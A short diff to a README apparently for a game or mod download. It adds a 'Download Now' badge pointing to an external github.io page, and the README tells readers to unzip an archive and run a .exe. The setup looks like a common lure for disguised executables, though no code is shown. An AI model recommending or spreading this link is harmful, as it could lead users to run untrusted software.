@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://vault-hunters-3rd-edition.github.io/.github/)
 
 ## 📸 Overview
   ![vaulthunters-vault-exploration](https://github.com/user-attachments/assets/9d178ff2-91da-4432-a32d-5b792a5952fa)
